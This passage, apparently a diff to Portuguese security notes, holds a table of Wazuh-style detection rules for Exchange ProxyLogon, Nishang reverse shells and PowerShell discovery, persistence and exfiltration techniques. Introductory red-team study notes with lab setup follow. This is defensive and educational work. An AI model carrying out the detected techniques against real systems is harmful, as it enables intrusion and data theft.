+| Cisco FTD | Múltiplas mensagens de alerta FTD. | Performance | Detecta volume anormal de mensagens de alerta, que pode indicar falha em cascata ou ataque em andamento. | <rule id="20010" level="8"><if_sid>91000</if_sid><field name="data.message">.*multiple.*alerts.*</field><description>Múltiplas mensagens de alerta FTD</description></rule> | Investigar correlação com outros eventos críticos e revisar configuração de alertas. |
+| Cisco FTD | FTD: Ataque de falsificação de IP detectado. | Security | Detecta spoofing de IP, usado frequentemente para evasão de controles ou movimentação lateral. | <rule id="20011" level="10"><if_sid>91000</if_sid><field name="data.message">.*IP spoofing.*detected.*</field><description>FTD: Ataque de falsificação de IP</description></rule> | Ativar verificação de IP spoofing e segmentação rigorosa da rede. |
+| MS Exchange | UMWorkerProcess.exe gerou processos inesperados. Possível atividade maliciosa. | Security | Detecta que o serviço de unificação de mensagens do Exchange criou processos inesperados, o que pode indicar execução remota. | <rule id="20101" level="10"><if_sid>91000</if_sid><field name="data.image">.*UMWorkerProcess.exe.*</field><description>UMWorkerProcess.exe criou processo suspeito</description></rule> | Isolar o host e verificar IOC relacionados ao ProxyLogon. |
+| MS Exchange | MS Exchange - Possível exploração da vulnerabilidade ProxyLogon (CVE-2021-26855). | Security | Detecta padrão de tráfego associado à exploração do ProxyLogon. | <rule id="20102" level="12"><if_sid>91000</if_sid><field name="data.message">.*ProxyLogon.*CVE-2021-26855.*</field><description>Exploração ProxyLogon CVE-2021-26855</description></rule> | Aplicar patches de segurança e monitorar indicadores de comprometimento. |
+| MS Exchange | MS Exchange - Possível exploração da vulnerabilidade ProxyLogon (CVE-2021-27065). | Security | Detecta possível exploração de execução remota via ProxyLogon relacionada ao CVE-2021-27065. | <rule id="20103" level="12"><if_sid>91000</if_sid><field name="data.message">.*ProxyLogon.*CVE-2021-27065.*</field><description>Exploração ProxyLogon CVE-2021-27065</description></rule> | Aplicar correções imediatas e verificar logs de execução remota. |
+| MS Exchange | Filtrando eventos de erro MSExchange Unified Message. | Performance | Ignora erros conhecidos de mensagens unificadas que não representam risco de segurança. | <rule id="20104" level="0"><if_sid>91000</if_sid><field name="data.source">.*MSExchange.*Unified.*Message.*</field><description>Filtro de erro conhecido MSExchange UM</description></rule> | Evitar geração de alertas desnecessários com filtros baseados em contexto. |
+| MS Exchange | MS Exchange - Possível exploração de desserialização (CVE-2021-26857). | Security | Alerta sobre tentativa de execução remota via desserialização maliciosa no Exchange. | <rule id="20105" level="12"><if_sid>91000</if_sid><field name="data.message">.*CVE-2021-26857.*</field><description>Possível exploração CVE-2021-26857</description></rule> | Atualizar Exchange e isolar hosts com comportamento anômalo. |
+| MS Exchange | Powershell inicializando o snapin MS Exchange. Possível despejo de dados da caixa de correio. | Security | Detecta uso de Powershell com o snapin do Exchange, comum em ataques para exfiltração de e-mails. | <rule id="20106" level="10"><if_sid>91000</if_sid><field name="data.command">.*Add-PSSnapin.*Microsoft.Exchange.*</field><description>Snapin do Exchange adicionado no PowerShell</description></rule> | Validar usuário, origem da sessão e bloquear uso indevido de snapins via GPO. |
+| MS Exchange | Possível execução de script de reverse shell Nishang Invoke-PowerShellTcpOneLine. | Security | Detecta execução de payload Nishang que abre conexão reversa via Powershell. | <rule id="20107" level="12"><if_sid>91000</if_sid><field name="data.command">.*Invoke-PowerShellTcpOneLine.*</field><description>Possível reverse shell Nishang</description></rule> | Bloquear execução de scripts remotos, habilitar proteção AMSI e alertar equipe de resposta a incidentes. |
+| Windows PowerShell | Grupo de regras do Windows para o canal Powershell/Operational. | Audit | Grupo de regras para monitorar execução de comandos PowerShell, útil para auditoria e investigação. | <rule id="20108" level="5"><if_sid>91000</if_sid><field name="win.system.channel">Microsoft-Windows-PowerShell/Operational</field><description>Monitoramento canal PowerShell/Operational</description></rule> | Habilitar auditoria de script e alertas para comandos suspeitos. |
+| Windows PowerShell | Grupo de regras do Windows para o canal Powershell/Operational. | Audit | Regra complementar para rastrear eventos do PowerShell via canal específico. | <rule id="20109" level="5"><if_sid>91000</if_sid><field name="win.system.channel">Microsoft-Windows-PowerShell/Operational</field><description>Canal PowerShell monitorado</description></rule> | Cruzar logs com Sysmon e controlar execução de scripts com políticas restritivas. |
+| Windows PowerShell | Método de captura de tela invocado a partir de script PowerShell. | Security | Detecta o uso de funções que capturam a tela via PowerShell, comportamento típico em ferramentas de exfiltração. | <rule id="30001" level="10"><if_sid>91000</if_sid><field name="data.command">.*System.Windows.Forms.Screen::AllScreens.*</field><description>Captura de tela via PowerShell</description></rule> | Investigar origem da execução, validar se é uso legítimo, e aplicar bloqueios via AppLocker. |
+| Windows PowerShell | Script PowerShell "Get-ADComputer" executado. | Discovery | Monitora o uso de comandos PowerShell para enumeração de ativos no AD. | <rule id="30002" level="8"><if_sid>91000</if_sid><field name="data.command">.*Get-ADComputer.*</field><description>Enumeração AD - Get-ADComputer</description></rule> | Restringir uso do módulo ActiveDirectory a usuários autorizados e registrar auditoria. |
+| Windows PowerShell | Script PowerShell "Get-NetUser" executado. | Discovery | Detecta enumeração de contas locais e de domínio por scripts. | <rule id="30003" level="8"><if_sid>91000</if_sid><field name="data.command">.*Get-NetUser.*</field><description>Enumeração de usuários com Get-NetUser</description></rule> | Revisar uso de ferramentas PowerView, aplicar controles de execução e segmentar acesso. |
+| Windows PowerShell | Script PowerShell fez uma consulta usando Get-ItemProperty. | Discovery | Detecta consultas no registro do Windows, geralmente para identificação de configurações de sistema ou software. | <rule id="30004" level="7"><if_sid>91000</if_sid><field name="data.command">.*Get-ItemProperty.*</field><description>Consulta ao registro com Get-ItemProperty</description></rule> | Analisar contexto do comando, aplicar GPOs para controlar acesso ao registro. |
+| Windows PowerShell | Script PowerShell consultou valor de registro. | Discovery | Identifica leitura de valores sensíveis do registro que podem indicar reconhecimento. | <rule id="30005" level="7"><if_sid>91000</if_sid><field name="data.command">.*Get-ItemPropertyValue.*</field><description>Consulta de valor de registro via PowerShell</description></rule> | Restringir comandos de leitura sensível a usuários confiáveis. |
+| Windows PowerShell | Script PowerShell pode estar usando o método de decodificação Base64. | Obfuscation | Detecta tentativa de ofuscação de código via Base64, comum em scripts maliciosos. | <rule id="30006" level="10"><if_sid>91000</if_sid><field name="data.command">.*FromBase64String.*</field><description>Decodificação Base64 em PowerShell</description></rule> | Bloquear execução de conteúdo codificado e alertar automaticamente para análise. |
+| Windows PowerShell | Script PowerShell pode estar executando código suspeito com a API CreateThread. | Execution | Identifica uso de API para injeção ou execução de código na memória. | <rule id="30007" level="12"><if_sid>91000</if_sid><field name="data.command">.*CreateThread.*</field><description>Execução via API CreateThread</description></rule> | Isolar host e iniciar investigação de comprometimento. |
+| Windows PowerShell | Script PowerShell executou "Expand-Archive". | Change | Detecta extração de arquivos comprimidos, podendo indicar movimentação lateral. | <rule id="30008" level="5"><if_sid>91000</if_sid><field name="data.command">.*Expand-Archive.*</field><description>Extração de arquivos via PowerShell</description></rule> | Validar contexto de uso e monitorar origem/destino dos arquivos. |
+| Windows PowerShell | Script PowerShell executou a exclusão de um objeto. | Change | Detecta comandos para deletar arquivos ou objetos do sistema. | <rule id="30009" level="8"><if_sid>91000</if_sid><field name="data.command">.*Remove-Item.*</field><description>Remoção de arquivos ou objetos</description></rule> | Alertar para possíveis ações maliciosas e verificar usuário/origem. |
+| Windows PowerShell | Script PowerShell excluiu uma chave de registro de um objeto. | Change | Detecta tentativa de modificar persistência ou configuração no registro. | <rule id="30010" level="9"><if_sid>91000</if_sid><field name="data.command">.*Remove-ItemProperty.*</field><description>Remoção de chave de registro via PowerShell</description></rule> | Auditar alterações em chaves críticas e restringir via GPO. |
+| Windows PowerShell | Script PowerShell excluiu uma chave de registro de auto inicialização. | Persistence | Detecta manipulação de chaves relacionadas à inicialização automática de programas. | <rule id="30011" level="10"><if_sid>91000</if_sid><field name="data.command">.*Remove-ItemProperty.*Run.*</field><description>Alteração de auto inicialização no registro</description></rule> | Verificar alterações de persistência e bloquear alterações não autorizadas. |
+| Windows PowerShell | PowerShell executando descoberta de processos. | Discovery | Detecta comando para listar processos em execução. | <rule id="30012" level="6"><if_sid>91000</if_sid><field name="data.command">.*Get-Process.*</field><description>Enumeração de processos ativos</description></rule> | Correlacionar com outros eventos de enumeração para verificar intenção do script. |
+| Windows PowerShell | Script PowerShell consultando variáveis de ambiente do sistema. | Discovery | Indica coleta de informações de sistema e rede, comum em fases iniciais de ataque. | <rule id="30013" level="7"><if_sid>91000</if_sid><field name="data.command">.*Get-ChildItem Env:.*</field><description>Consulta de variáveis de ambiente</description></rule> | Monitorar o uso e validar se o script é legítimo. |
+| Windows PowerShell | Script PowerShell executou a API "ConvertSidToStringSid". Possível enumeração do SID do domínio. | Discovery | Detecta tentativa de identificar SIDs para mapeamento de domínio e permissões. | <rule id="30014" level="9"><if_sid>91000</if_sid><field name="data.command">.*ConvertSidToStringSid.*</field><description>Enumeração SID de domínio</description></rule> | Analisar comportamento e relacionar com outros eventos suspeitos. |
+| Windows PowerShell | Script PowerShell executou o comando "New-Service". | Persistence | Detecta criação de novo serviço no Windows, típico em tentativas de persistência. | <rule id="30015" level="10"><if_sid>91000</if_sid><field name="data.command">.*New-Service.*</field><description>Criação de novo serviço via PowerShell</description></rule> | Bloquear criação de serviços por usuários não administradores e alertar equipe de segurança. |
+| Windows PowerShell | Script PowerShell pesquisou o sistema de arquivos. | Discovery | Detecta varreduras no sistema de arquivos, geralmente para reconhecimento ou preparação de exfiltração. | <rule id="30016" level="8"><if_sid>91000</if_sid><field name="data.command">.*Get-ChildItem.*</field><description>Pesquisa de sistema de arquivos via PowerShell</description></rule> | Correlacionar com atividades posteriores como compressão ou envio de dados. Monitorar frequência e origem do comando. |
+| Windows PowerShell | Script PowerShell coletou arquivos de uma pesquisa no sistema de arquivos. | Collection | Indica possível coleta de dados após varredura do sistema de arquivos. | <rule id="30017" level="9"><if_sid>91000</if_sid><field name="data.command">.*Select-String.*</field><description>Coleta de dados após pesquisa com PowerShell</description></rule> | Verificar quais arquivos foram acessados e o conteúdo pesquisado. Implementar DLP e controle de acesso. |
+| Windows PowerShell | Script PowerShell criou um arquivo comprimido a partir dos resultados da pesquisa no sistema de arquivos. | Exfiltration | Detecta tentativa de preparar arquivos para exfiltração. | <rule id="30018" level="10"><if_sid>91000</if_sid><field name="data.command">.*Compress-Archive.*</field><description>Criação de arquivo comprimido via PowerShell</description></rule> | Investigar contexto da ação. Aplicar regras de detecção de movimentação de dados em massa. |
+| Windows PowerShell | Script PowerShell usou o cmdlet "Invoke-command" para executar um subscript. | Execution | Identifica execução de scripts remotos ou em subsessões. | <rule id="30019" level="9"><if_sid>91000</if_sid><field name="data.command">.*Invoke-Command.*</field><description>Execução de subscripts com Invoke-Command</description></rule> | Monitorar origem dos scripts e destino da execução. Restringir uso remoto a máquinas confiáveis. |
+| Windows PowerShell | Script PowerShell usou o cmdlet "Invoke-command" para executar código em computador remoto. | Lateral Movement | Detecta movimentação lateral com uso de PowerShell Remoting. | <rule id="30020" level="10"><if_sid>91000</if_sid><field name="data.command">.*Invoke-Command.*-ComputerName.*</field><description>Movimentação lateral com Invoke-Command</description></rule> | Auditar conexões remotas e aplicar controles de segmentação de rede e autenticação forte. |
+| Windows PowerShell | Script PowerShell coletou dados da área de transferência. | Collection | Monitora uso de comandos para acessar conteúdo do clipboard, podendo indicar roubo de dados. | <rule id="30021" level="9"><if_sid>91000</if_sid><field name="data.command">.*Get-Clipboard.*</field><description>Coleta da área de transferência via PowerShell</description></rule> | Alertar para comportamentos suspeitos em máquinas sensíveis. Analisar origem e destino da execução. |
+| Windows PowerShell | Script PowerShell executou compressão de arquivo. | Exfiltration | Detecta compressão como possível etapa para envio de dados. | <rule id="30022" level="8"><if_sid>91000</if_sid><field name="data.command">.*Compress-Archive.*</field><description>Compressão de arquivos via PowerShell</description></rule> | Verificar se os arquivos compactados são sensíveis. Implementar criptografia e controle de acesso. |
+| Windows PowerShell | Script PowerShell executou "Copy-Item". | Collection | Detecta cópia de arquivos, podendo indicar movimentação de dados para outros locais ou sistemas. | <rule id="30023" level="6"><if_sid>91000</if_sid><field name="data.command">.*Copy-Item.*</field><description>Cópia de arquivos via PowerShell</description></rule> | Correlacionar com comandos de compressão e envio. Restringir movimentações fora de diretórios autorizados. |
+| Windows PowerShell | Script PowerShell executou "Set-WmiInstance". Possível criação ou atualização de uma instância WMI. | Persistence | Detecta alterações em WMI, comumente usadas para persistência de malware. | <rule id="30024" level="10"><if_sid>91000</if_sid><field name="data.command">.*Set-WmiInstance.*</field><description>Alteração de instância WMI via PowerShell</description></rule> | Revisar logs WMI, validar integridade dos objetos criados e aplicar políticas de controle de scripts. |
+| Windows PowerShell | Script PowerShell executou criação ou atualização de uma instância WMI com valores codificados. | Persistence | Alerta para uso obfuscado de WMI para persistência. | <rule id="30025" level="11"><if_sid>91000</if_sid><field name="data.command">.*Set-WmiInstance.*Base64.*</field><description>WMI com valores codificados</description></rule> | Bloquear execuções de PowerShell com conteúdo codificado. Investigar possível atividade persistente. |
+| Windows PowerShell | Script PowerShell executou "GetComputerNameEx". Possível descoberta de configuração do sistema. | Discovery | Detecta coleta de nome completo do host para reconhecimento. | <rule id="30026" level="5"><if_sid>91000</if_sid><field name="data.command">.*GetComputerNameEx.*</field><description>Coleta de nome do computador via PowerShell</description></rule> | Correlacionar com outras ações de descoberta. Avaliar se é uso legítimo. |
+| Windows PowerShell | Script PowerShell executou "NetWkstaGetInfo". Possível descoberta de configuração de rede. | Discovery | Detecta coleta de informações de rede, como domínio e nome do computador. | <rule id="30027" level="5"><if_sid>91000</if_sid><field name="data.command">.*NetWkstaGetInfo.*</field><description>Coleta de info de rede via PowerShell</description></rule> | Verificar padrão de uso em endpoints e limitar execução remota. |
+| Windows PowerShell | Script PowerShell executou "GetUserNameEx". Possível descoberta de informações do usuário. | Discovery | Detecta coleta do nome estendido de usuário, útil em ataques direcionados. | <rule id="30028" level="6"><if_sid>91000</if_sid><field name="data.command">.*GetUserNameEx.*</field><description>Enumeração de nome de usuário via PowerShell</description></rule> | Auditar atividades em contas administrativas. Monitorar contexto do comando. |
+| Windows PowerShell | Powershell executou "CreateToolhelp32Snapshot". Possível descoberta de processos. | Discovery | Identifica uso de API de snapshot para listar processos no sistema. | <rule id="30029" level="7"><if_sid>91000</if_sid><field name="data.command">.*CreateToolhelp32Snapshot.*</field><description>Descoberta de processos via snapshot</description></rule> | Bloquear scripts não assinados e revisar uso dessa API em endpoints. |
+| Windows PowerShell | Possível atividade de descoberta: Powershell executou o comando "Get-ChildItem" em uma pasta do sistema. | Discovery | Detecta exploração de diretórios sensíveis como C:\Windows ou C:\Users via PowerShell. | <rule id="30030" level="8"><if_sid>91000</if_sid><field name="data.command">.*Get-ChildItem.*Windows.*</field><description>Enumeração em pastas do sistema</description></rule> | Monitorar recorrência da ação e validar se a origem é autorizada. Aplicar políticas de minimização de privilégio. |
+| Windows PowerShell | Powershell executou um comando que modifica o timestamp de arquivos, possível tentativa de timestomp. | Defense Evasion | Detecta tentativa de encobrir a atividade maliciosa por meio da alteração de data/hora dos arquivos. | <rule id="30031" level="10"><if_sid>91000</if_sid><field name="data.command">.*Set-ItemProperty.*LastWriteTime.*</field><description>Modificação de timestamp via PowerShell</description></rule> | Restringir permissão de modificação de metadados e correlacionar com processos suspeitos ou fora do horário de expediente. |
+| Windows PowerShell | Powershell manipulando a classe WMI AntiVirusProduct - Descoberta de software antivírus. | Discovery | Identifica coleta de informações de produtos de segurança instalados, geralmente para evasão. | <rule id="30032" level="8"><if_sid>91000</if_sid><field name="data.command">.*Get-WmiObject.*AntiVirusProduct.*</field><description>Consulta à classe AntiVirusProduct</description></rule> | Monitorar ações subsequentes que indiquem desativação de AV. Validar se execução foi por administrador legítimo. |
+| Windows PowerShell | Powershell manipulando informações de instalação de software no registro do sistema. | Discovery | Detecta enumeração de softwares instalados via PowerShell. | <rule id="30033" level="7"><if_sid>91000</if_sid><field name="data.command">.*Get-ItemProperty.*Uninstall.*</field><description>Coleta de softwares instalados via registro</description></rule> | Revisar contexto de execução e correlacionar com acessos remotos. Aplicar bloqueios por política. |
+| Windows PowerShell | Powershell executou "Get-Content -Stream" ou "Invoke-Expression". Possível execução de string como código. | Execution | Identifica técnicas de obfuscação e execução de código dinâmico via PowerShell. | <rule id="30034" level="10"><if_sid>91000</if_sid><field name="data.command">.*Invoke-Expression.*|.*Get-Content.*-Stream.*</field><description>Execução dinâmica com PowerShell</description></rule> | Bloquear uso de Invoke-Expression via políticas de segurança. Monitorar comportamento anômalo em scripts. |
+| Windows PowerShell | Powershell consultou Win32_BIOS. Possível atividade de detecção de sandbox. | Discovery | Detecta consulta de parâmetros de BIOS, comum em verificação de ambiente virtualizado. | <rule id="30035" level="7"><if_sid>91000</if_sid><field name="data.command">.*Get-WmiObject.*Win32_BIOS.*</field><description>Consulta à BIOS via PowerShell</description></rule> | Correlacionar com outras consultas WMI. Monitorar execuções recorrentes por scripts não autorizados. |
+| Windows PowerShell | Powershell consultou Win32_ComputerSystem. Possível atividade de descoberta do sistema. | Discovery | Identifica enumeração da máquina local, como modelo, fabricante, domínio. | <rule id="30036" level="6"><if_sid>91000</if_sid><field name="data.command">.*Get-WmiObject.*Win32_ComputerSystem.*</field><description>Descoberta de sistema via WMI</description></rule> | Verificar se execução foi autorizada. Aplicar detecção combinada com outras WMI. |
+| Windows PowerShell | Powershell consultou Win32_PnPEntity. Possível atividade de descoberta de dispositivos/ adaptadores. | Discovery | Detecta coleta de informações de dispositivos conectados, comum em reconhecimento de ambiente. | <rule id="30037" level="6"><if_sid>91000</if_sid><field name="data.command">.*Get-WmiObject.*Win32_PnPEntity.*</field><description>Enumeração de hardware via PowerShell</description></rule> | Restringir scripts a executar WMI em ambientes sensíveis. Monitorar dispositivos não reconhecidos. |
+| Windows PowerShell | Powershell consultou Win32_Process. Possível atividade de descoberta de processos. | Discovery | Detecta listagem ativa de processos por scripts, pode ser precursor de injeção ou monitoramento. | <rule id="30038" level="6"><if_sid>91000</if_sid><field name="data.command">.*Get-WmiObject.*Win32_Process.*</field><description>Coleta de processos via PowerShell</description></rule> | Correlacionar com tentativas de manipulação de processos. Ativar proteção contra scripts não assinados. |
+| Windows PowerShell | Powershell executou "Get-Item -Path". Script tentando ver arquivos no caminho. | Discovery | Detecta enumeração de arquivos/pastas por PowerShell. | <rule id="30039" level="5"><if_sid>91000</if_sid><field name="data.command">.*Get-Item.*-Path.*</field><description>Enumeração de arquivos com Get-Item</description></rule> | Limitar escopo de scripts e aplicar detecção por volume de acessos a diretórios sensíveis. |
+| Windows PowerShell | Powershell executou "New-ItemProperty -Path". Possível adição de novo item ao registro. | Persistence | Detecta escrita de chaves no registro, técnica usada para persistência. | <rule id="30040" level="9"><if_sid>91000</if_sid><field name="data.command">.*New-ItemProperty.*-Path.*</field><description>Modificação de registro via PowerShell</description></rule> | Monitorar chaves críticas de inicialização. Verificar integridade de entradas novas no registro. |
+| Windows PowerShell | Possível adição de novo item ao registro de inicialização do Windows. | Persistence | Detecta tentativa de persistência via registro, como run keys. | <rule id="30041" level="10"><if_sid>91000</if_sid><field name="data.command">.*New-ItemProperty.*\\Run.*</field><description>Persistência via chave Run do registro</description></rule> | Aplicar monitoramento contínuo de chaves de inicialização. Validar origem da alteração. |
+| Windows PowerShell | Add-in do Outlook foi carregado por powershell, possível uso para coleta de e-mails. | Collection | Detecta abuso do Outlook para exfiltração ou coleta de e-mails. | <rule id="30042" level="10"><if_sid>91000</if_sid><field name="data.command">.*Outlook.Application.*</field><description>Uso de Outlook via PowerShell</description></rule> | Investigar scripts que acessam COM objects. Monitorar interações com clientes de e-mail. |
+| Windows PowerShell | Powershell usou o método de compressão .NET, possível operação de extração de dados. | Exfiltration | Detecta uso da compressão via System.IO.Compression como preparação para exfiltração. | <rule id="30043" level="9"><if_sid>91000</if_sid><field name="data.command">.*System.IO.Compression.*</field><description>Compressão .NET via PowerShell</description></rule> | Auditar compressões em massa. Verificar movimentação dos arquivos após compressão. |
+| Oracle DB | Transação OracleDB. | Change | Detecta transações em banco de dados Oracle que podem alterar dados. | <rule id="30044" level="5"><if_sid>92000</if_sid><field name="oracle.action">TRANSACTION</field><description>Transação Oracle DB detectada</description></rule> | Auditar origem, usuário e conteúdo das transações. Aplicar segregação de funções e monitoramento contínuo. |
+| Oracle DB | Alertas do Oracle DB. | Security | Detecta eventos críticos registrados no banco Oracle, como falhas de autenticação ou políticas violadas. | <rule id="30045" level="9"><if_sid>92000</if_sid><field name="oracle.alert">.*</field><description>Alerta crítico do Oracle DB</description></rule> | Avaliar criticidade dos alertas e automatizar respostas para eventos reincidentes. Integrar com SIEM. |
+
+## CIS CONTROL
+
+ 🔴 O que é Red Team?
+
+O **Red Team** é um grupo de profissionais de segurança especializados em simular ataques reais contra sistemas, redes e pessoas, com o objetivo de identificar vulnerabilidades antes que atacantes reais o façam. É uma abordagem ofensiva dentro da segurança da informação.
+
+
+ 🎯 Objetivo
+
+Avaliar a **efetividade das defesas** da organização de forma realista, indo além dos testes tradicionais (como o pentest), simulando ameaças avançadas e persistentes (APT – Advanced Persistent Threat).
+
+
+ 🔧 Atividades Comuns
+
+- Simulação de invasões físicas e digitais  
+- Testes de engenharia social (ex: phishing, vishing)  
+- Exploração de falhas em aplicações e infraestrutura  
+- Uso de técnicas avançadas para evitar detecção (evasão)  
+- Desenvolvimento de malwares personalizados para testes  
+- Avaliação da capacidade de resposta da equipe de defesa (Blue Team)
+
+
+ 📌 Diferença entre Red Team e Pentest
+
+| Característica        | Red Team                         | Pentest                        |
+|-----------------------|----------------------------------|--------------------------------|
+| Escopo                | Amplo e realista                 | Limitado e técnico             |
+| Foco                  | Simular ataque real              | Encontrar vulnerabilidades     |
+| Duração               | Semanas ou meses                 | Dias ou semanas                |
+| Sigilo                | Alta discrição                   | Transparente com TI            |
+| Detecção              | Deve **evitar ser detectado**    | Pode ser detectado             |
+
+
+ 🧠 Perfis do Time
+
+- Ethical Hacker / Offensive Security Expert  
+- Exploit Developer  
+- Especialista em Engenharia Social  
+- Red Team Operator  
+- Profissional com certificações como:  
+  - OSCP / OSCE / OSEP  
+  - CRTO (Certified Red Team Operator)  
+  - eCPTX / eCPTXv2  
+
+
+ 🛠️ Ferramentas Usadas
+
+- **Cobalt Strike**, **Sliver**, **Mythic** (C2 frameworks)  
+- **Metasploit**, **Impacket**, **BloodHound**, **Mimikatz**  
+- Ferramentas próprias ou personalizadas  
+- Scripts de evasão e ofuscação  
+- Plataformas de phishing (GoPhish, King Phisher)
+
+
+ 🔄 Relação com Outros Times
+
+- **Blue Team (🔵):** O Red Team desafia o Blue Team, forçando-o a melhorar suas defesas.  
+- **Purple Team (🟣):** Uma colaboração entre Red e Blue para melhorar continuamente os dois lados.  
+- **White Team (⚪):** Define regras, monitora, garante a ética e neutralidade dos exercícios.
+
+
+ 📚 Frameworks de Referência
+
+- MITRE ATT&CK  
+- Red Team Tactics (RTT)  
+- NIST SP 800-115  
+- TIBER-EU (Threat Intelligence-Based Ethical Red Teaming)
+
+
+ ✅ Benefícios para a Organização
+
+- Revela falhas reais de segurança, inclusive humanas  
+- Melhora a prontidão da equipe de resposta a incidentes  
+- Testa defesas em cenários realistas  
+- Reduz o impacto de ataques reais
+
+ 🔴 Red Team N1: Conceitos Básicos de Segurança da Informação – Confidencialidade, Integridade e Disponibilidade (CIA)
+
+Antes de planejar e executar ataques simulados, é fundamental entender os princípios básicos que regem a segurança da informação. O modelo CIA (Confidencialidade, Integridade e Disponibilidade) guia tanto defensores quanto ofensores na proteção e exploração de sistemas.
+
+Conheça o terreno para atacar com eficácia.
+
+---
+
+ 🧠 O que é o modelo CIA?
+
+O modelo CIA define três objetivos principais que toda segurança deve buscar:
+
+- **Confidencialidade:** garantir que a informação seja acessível apenas a quem tem permissão  
+- **Integridade:** assegurar que os dados não sejam alterados indevidamente  
+- **Disponibilidade:** manter o acesso à informação e sistemas sempre que necessário  
+
+---
+
+ 🧱 Impacto do modelo CIA no Red Team
+
+ 1. Confidencialidade
+
+- Identificar formas de acessar dados restritos (exfiltração)  
+- Explorar falhas em controles de acesso e autenticação  
+- Bypass de criptografia e engenharia social para obter credenciais  
+
+ 2. Integridade
+
+- Investigar formas de alterar dados para desestabilizar sistemas ou encobrir rastros  
+- Modificação de logs, arquivos e configurações para esconder presença  
+- Ataques de injeção e manipulação de processos  
+
+ 3. Disponibilidade
+
+- Avaliar vulnerabilidades que causem interrupção (DoS/DDoS)  
+- Impactar sistemas críticos para gerar impacto operacional  
+- Planejar ataques que causem degradação do serviço sem detecção imediata  
+
+---
+
+ 🔍 Exemplos práticos
+
+```
+- Confidencialidade: phishing para capturar credenciais administrativas  
+- Integridade: alteração de registros para evitar detecção em uma invasão  
+- Disponibilidade: ataque de negação de serviço contra um servidor web  
+```
+
+---
+
+ ⚙️ Como usar o modelo CIA para planejar ataques
+
+- Analise quais pilares são mais frágeis no alvo para escolher a estratégia  
+- Explore a cadeia de ataques que comprometam um ou mais pilares  
+- Utilize técnicas avançadas para maximizar o impacto e minimizar a detecção  
+- Prepare-se para adaptar o ataque conforme as defesas identificadas  
+
+---
+
+ ✅ Conclusão
+
+Entender Confidencialidade, Integridade e Disponibilidade é fundamental para que um Red Team N1 planeje ataques eficazes e realistas. Dominar esses conceitos ajuda a identificar pontos fracos e maximizar o sucesso das simulações ofensivas.
+
+---
+
+ 🔴 Red Team N1: Fundamentos de Redes – TCP/IP, DNS e HTTP
+
+Para atuar com eficácia em Red Team, é essencial dominar os fundamentos das redes, pois grande parte das técnicas ofensivas depende do entendimento dos protocolos de comunicação. Conhecer TCP/IP, DNS e HTTP ajuda a mapear alvos, explorar vulnerabilidades e evadir defesas.
+
+Domine a rede para atacar com precisão.
+
+---
+
+ 🧠 Principais protocolos para o Red Team
+
+- **TCP/IP:** base da comunicação na internet, permite troca de pacotes entre dispositivos  
+- **DNS:** serviço de resolução de nomes que traduz domínios em endereços IP  
+- **HTTP:** protocolo usado para comunicação web, alvo frequente de ataques  
+
+---
+
+ 🧱 Conceitos essenciais
+
+ 1. TCP/IP
+
+- Modelo em camadas: Aplicação, Transporte, Internet, Link  
+- TCP: conexão confiável, controle de fluxo e retransmissão  
+- IP: roteamento e endereçamento dos pacotes  
+- Ferramentas: nmap para escaneamento e análise de portas  
+
+ 2. DNS
+
+- Como funciona a resolução de nomes em IPs  
+- Tipos de registros DNS: A, MX, CNAME, TXT  
+- Técnicas de ataque: DNS spoofing, DNS tunneling  
+
+ 3. HTTP
+
+- Funcionamento básico do protocolo (requests e responses)  
+- Métodos comuns: GET, POST, PUT, DELETE  
+- Exploração: ataques de injeção, XSS, manipulação de headers  
+
+---
+
+ 🔍 Exemplos práticos
+
+```
+- TCP/IP: usar nmap para mapear portas abertas no alvo  
+- DNS: coletar informações públicas via DNS enumeration  
+- HTTP: testar formulários web para vulnerabilidades de injeção  
+```
+
+---
+
+ ⚙️ Como aplicar no Red Team
+
+- Utilize o conhecimento para planejar fases de reconhecimento e exploração  
+- Explore fraquezas na configuração dos protocolos para obter acesso  
+- Use técnicas de evasão baseadas no comportamento dos protocolos  
+- Combine informações obtidas para construir ataques mais eficazes  
+
+---
+
+ ✅ Conclusão
+
+Dominar os fundamentos de TCP/IP, DNS e HTTP é crucial para qualquer Red Team N1 que deseja realizar ataques realistas e eficientes. Esses protocolos são a base das comunicações e seu conhecimento abre portas para inúmeras técnicas ofensivas.
+
+---
+
+ 🔴 Red Team N1: Instalando VMs para Laboratório – Kali Linux (Red Team) e Security Onion/Windows Server (Blue Team)
+
+Montar um laboratório prático é fundamental para o desenvolvimento das habilidades de Red Team. Ter um ambiente controlado com máquinas para ataque (Kali Linux) e defesa (Security Onion ou Windows Server) permite simular cenários reais e testar técnicas sem riscos.
+
+Prepare seu ambiente para praticar com segurança.
+
+---
+
+ 🧠 Por que montar um laboratório com VMs?
+
+- Praticar ataques e defesas em ambiente seguro  
+- Testar ferramentas, técnicas e estratégias com liberdade  
+- Entender o comportamento dos sistemas e respostas a ataques  
+- Desenvolver habilidades de análise e mitigação  
+
+---
+
+ 🧱 Passos para instalação das VMs
+
+ 1. Escolher a plataforma de virtualização
+
+- Recomendo: **VirtualBox** (gratuito) ou **VMware Workstation Player**  
+- Instale no seu computador conforme o sistema operacional  
+
+ 2. Baixar as imagens ISO
+
+- **Kali Linux:** [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)  
+- **Security Onion:** [https://securityonion.net/](https://securityonion.net/)  
+- **Windows Server:** obtenha via portal da Microsoft ou licenças de avaliação  
+
+ 3. Criar a VM Kali Linux
+
+- Configurar memória (mínimo 2GB, recomendado 4GB+)  
+- Definir disco virtual (mínimo 20GB)  
+- Configurar rede em modo bridge ou NAT para comunicação com outras VMs  
+- Instalar Kali a partir do ISO baixado  
+
+ 4. Criar a VM Security Onion ou Windows Server
+
+- Configurar recursos semelhantes (memória, disco)  
+- Instalar a partir do ISO ou imagem correspondente  
+- Configurar rede para comunicar com Kali e com seu host  
+
+---
+
+ 🔍 Dicas para configuração e uso
+
+```
+- Reserve uma rede virtual interna para isolar o laboratório da rede principal  
+- Atualize os sistemas e instale ferramentas adicionais conforme necessidade  
+- Configure snapshots para salvar estados antes de testes importantes  
+- Pratique comandos básicos, ataques simulados e análise de logs entre as VMs  
+```
+
+---
+
+ ✅ Conclusão
+
+Ter um laboratório com Kali Linux para Red Team e Security Onion ou Windows Server para Blue Team é essencial para a prática segura e eficaz. Esse ambiente facilita o aprendizado, experimentação e desenvolvimento de habilidades práticas.
+
+---
+
+ 🔴 Red Team N1: Material de Estudo – Curso Introdutório de Segurança e Recursos no YouTube
+
